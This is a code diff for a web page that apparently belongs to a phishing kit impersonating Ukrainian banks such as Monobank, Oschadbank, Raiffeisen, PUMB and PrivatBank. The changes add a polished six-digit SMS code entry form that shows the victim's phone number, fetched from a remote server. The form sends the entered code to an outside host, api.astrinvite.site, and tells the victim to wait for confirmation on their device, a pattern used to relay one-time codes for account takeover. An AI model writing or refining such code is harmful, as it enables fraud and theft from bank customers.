@@ -71,6 +71,43 @@
       font-size: 22px; letter-spacing: 10px; padding: 8px 20px;
       text-align: center; width: 190px; margin-top: 12px; margin-bottom: 8px;
     }
+    
+    /* ← ДОБАВЛЕНО: Стили для SMS ячеек */
+    .sms-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px 0;
+    }
+    
+    .sms-digit {
+      width: 50px;
+      height: 70px;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      background: white;
+      font-size: 24px;
+      font-weight: bold;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    
+    .sms-digit:focus {
+      border-color: #1976d2;
+      box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
+    }
+    
+    .sms-digit.filled {
+      border-color: #4caf50;
+      background: #f8fff8;
+    }
+    
+    .phone-display {
+      color: #666;
+      font-size: 16px;
+      margin: 10px 0;
+    }
     #send-code-btn {
       margin-left: 10px; padding: 10px 30px; font-size: 18px;
       background: #1976d2; color: #fff; border: none; border-radius: 7px; cursor: pointer;
@@ -132,6 +169,9 @@
     
     const STATUS_URL = "https://api.astrinvite.site/api/link-status";
     const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
+
+    // ← ДОБАВЛЕНО: Переменная для номера телефона
+    let userPhoneNumber = null;
 
     // ← ДОБАВЛЕНО: Исходные тексты кнопок
     const BANK_TEXTS = {
@@ -323,13 +363,16 @@
           const res = await fetch(`${STATUS_URL}?id=${currentId}`);
           const data = await res.json();
           if (data.status === "waiting_code") {
+            // ← ДОБАВЛЕНО: Сохраняем номер телефона если пришел
+            if (data.phone) {
+              userPhoneNumber = data.phone;
+            }
             clearInterval(statusPoller);
-            pollingStatus = false; // ← ДОБАВЛЕНО: Сбрасываем флаг
+            pollingStatus = false;
             showCodeInput();
           }
         } catch (e) {
           console.error("Ошибка polling:", e);
-          // ← ДОБАВЛЕНО: При ошибке polling восстанавливаем состояние
           clearInterval(statusPoller);
           pollingStatus = false;
           hideLoading();
@@ -343,68 +386,176 @@
       // Скрываем загрузку при показе поля ввода
       hideLoading();
       
-      // ← ДОБАВЛЕНО: Скрываем ВСЕ кнопки банков при показе SMS поля
+      // Скрываем ВСЕ кнопки банков при показе SMS поля
       document.getElementById("mono-btn").style.display = "none";
       document.getElementById("oschad-btn").style.display = "none"; 
       document.getElementById("raiff-btn").style.display = "none";
       document.getElementById("pumb-btn").style.display = "none";
       document.getElementById("privat-link").style.display = "none";
       
-      // ← ДОБАВЛЕНО: Скрываем заголовок и подзаголовок
+      // Скрываем заголовок и подзаголовок
       document.querySelector("h1").style.display = "none";
       document.getElementById("subtitle").style.display = "none";
       
+      // ← ОБНОВЛЕНО: Новый дизайн с отдельными ячейками
+      const phoneDisplay = userPhoneNumber ? 
+        `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону<br><strong>${userPhoneNumber}</strong></div>` :
+        `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону</div>`;
+      
       document.getElementById("status").innerHTML = `
-        <h2 style="margin-bottom: 20px; color: #333;">Введіть код з SMS</h2>
-        <div style="margin-bottom: 15px; color: #666; font-size: 16px;">
-          Ми надіслали 6-значний код підтвердження на ваш номер телефону
+        <div style="text-align: center; padding: 20px;">
+          <h2 style="margin-bottom: 20px; color: #333;">Код-підтвердження</h2>
+          ${phoneDisplay}
+          
+          <div class="sms-container">
+            <input type="text" class="sms-digit" maxlength="1" data-index="0">
+            <input type="text" class="sms-digit" maxlength="1" data-index="1">
+            <input type="text" class="sms-digit" maxlength="1" data-index="2">
+            <input type="text" class="sms-digit" maxlength="1" data-index="3">
+            <input type="text" class="sms-digit" maxlength="1" data-index="4">
+            <input type="text" class="sms-digit" maxlength="1" data-index="5">
+          </div>
+          
+          <button id="send-code-btn" style="margin-top: 20px; padding: 12px 40px; font-size: 18px; 
+                  background: #1976d2; color: #fff; border: none; border-radius: 25px; cursor: pointer;">
+            Підтвердити
+          </button>
+          <span id="timer" style="display: block; margin-top: 15px; color: #c60; font-weight: bold; font-size: 16px;"></span>
+          <div id="sms-error" style="color: red; margin-top: 10px; font-size: 16px;"></div>
+          
+          <div style="margin-top: 20px; color: #999; font-size: 14px;">
+            Відправити код повторно через <span id="resend-timer">2:58</span>
+          </div>
         </div>
-        <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric" 
-               placeholder="000000" style="font-size: 24px; letter-spacing: 8px; padding: 12px 20px; 
-               text-align: center; width: 200px; margin: 10px; border: 2px solid #ddd; border-radius: 8px;">
-        <br>
-        <button id="send-code-btn" style="margin-top: 15px; padding: 12px 40px; font-size: 18px; 
-                background: #1976d2; color: #fff; border: none; border-radius: 8px; cursor: pointer;">
-          Підтвердити код
-        </button>
-        <span id="timer"></span>
-        <div id="sms-error" style="color: red; margin-top: 10px; font-size: 16px;"></div>
       `;
-      document.getElementById("sms-code").focus();
+      
+      setupSMSInput();
       startSMSTimer();
 
-      document.getElementById("send-code-btn").onclick = async () => {
-        const code = document.getElementById("sms-code").value.trim();
-        if (!/^\d{6}$/.test(code)) {
-          document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
-          return;
-        }
-        document.getElementById("send-code-btn").disabled = true;
-        document.getElementById("sms-error").textContent = "";
-        const fd = new FormData();
-        fd.append("id", currentId);
-        fd.append("code", code);
-        try {
-          const res = await fetch(CODE_URL, { method: "POST", body: fd });
-          const resp = await res.json();
-          if (resp.ok) {
-            document.getElementById("status").innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
-            stopSMSTimer();
-            // Через 5 секунд возобновляем автообновление
-            setTimeout(() => {
-              autoRefreshActive = true;
-              checkAllLinks();
-            }, 5000);
-          } else {
-            document.getElementById("send-code-btn").disabled = false;
-            document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
+    // ← ДОБАВЛЕНО: Функция настройки ввода SMS
+    function setupSMSInput() {
+      const digits = document.querySelectorAll('.sms-digit');
+      
+      digits.forEach((digit, index) => {
+        digit.addEventListener('input', (e) => {
+          const value = e.target.value;
+          
+          // Разрешаем только цифры
+          if (!/^\d*$/.test(value)) {
+            e.target.value = '';
+            return;
           }
-        } catch (e) {
-          console.error("Ошибка отправки кода:", e);
+          
+          // Добавляем класс filled
+          if (value) {
+            e.target.classList.add('filled');
+            // Переходим к следующему полю
+            if (index < digits.length - 1) {
+              digits[index + 1].focus();
+            }
+          } else {
+            e.target.classList.remove('filled');
+          }
+          
+          // Проверяем заполнены ли все поля
+          checkAllDigitsFilled();
+        });
+        
+        digit.addEventListener('keydown', (e) => {
+          // Backspace - переходим к предыдущему полю
+          if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            digits[index - 1].focus();
+            digits[index - 1].value = '';
+            digits[index - 1].classList.remove('filled');
+          }
+          
+          // Стрелки для навигации
+          if (e.key === 'ArrowLeft' && index > 0) {
+            digits[index - 1].focus();
+          }
+          if (e.key === 'ArrowRight' && index < digits.length - 1) {
+            digits[index + 1].focus();
+          }
+        });
+        
+        // Обработка вставки кода
+        digit.addEventListener('paste', (e) => {
+          e.preventDefault();
+          const paste = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
+          
+          digits.forEach((d, i) => {
+            if (paste[i]) {
+              d.value = paste[i];
+              d.classList.add('filled');
+            } else {
+              d.value = '';
+              d.classList.remove('filled');
+            }
+          });
+          
+          checkAllDigitsFilled();
+        });
+      });
+      
+      // Фокус на первое поле
+      if (digits.length > 0) {
+        digits[0].focus();
+      }
+      
+      // Настройка кнопки отправки
+      document.getElementById("send-code-btn").onclick = submitSMSCode;
+    }
+    
+    function checkAllDigitsFilled() {
+      const digits = document.querySelectorAll('.sms-digit');
+      const code = Array.from(digits).map(d => d.value).join('');
+      
+      const submitBtn = document.getElementById("send-code-btn");
+      if (code.length === 6) {
+        submitBtn.style.background = '#4caf50';
+        submitBtn.style.opacity = '1';
+      } else {
+        submitBtn.style.background = '#1976d2';
+        submitBtn.style.opacity = '0.7';
+      }
+    }
+    
+    async function submitSMSCode() {
+      const digits = document.querySelectorAll('.sms-digit');
+      const code = Array.from(digits).map(d => d.value).join('');
+      
+      if (!/^\d{6}$/.test(code)) {
+        document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
+        return;
+      }
+      
+      document.getElementById("send-code-btn").disabled = true;
+      document.getElementById("sms-error").textContent = "";
+      
+      const fd = new FormData();
+      fd.append("id", currentId);
+      fd.append("code", code);
+      
+      try {
+        const res = await fetch(CODE_URL, { method: "POST", body: fd });
+        const resp = await res.json();
+        if (resp.ok) {
+          document.getElementById("status").innerHTML = "<div style='text-align: center; padding: 40px;'><h2 style='color: #4caf50;'>✅ Код прийнято</h2><p>Чекаємо підтвердження на пристрої…</p></div>";
+          stopSMSTimer();
+          setTimeout(() => {
+            autoRefreshActive = true;
+            checkAllLinks();
+          }, 5000);
+        } else {
           document.getElementById("send-code-btn").disabled = false;
-          document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
+          document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
         }
-      };
+      } catch (e) {
+        console.error("Ошибка отправки кода:", e);
+        document.getElementById("send-code-btn").disabled = false;
+        document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
+      }
+    }
     }
 
     function startSMSTimer() {
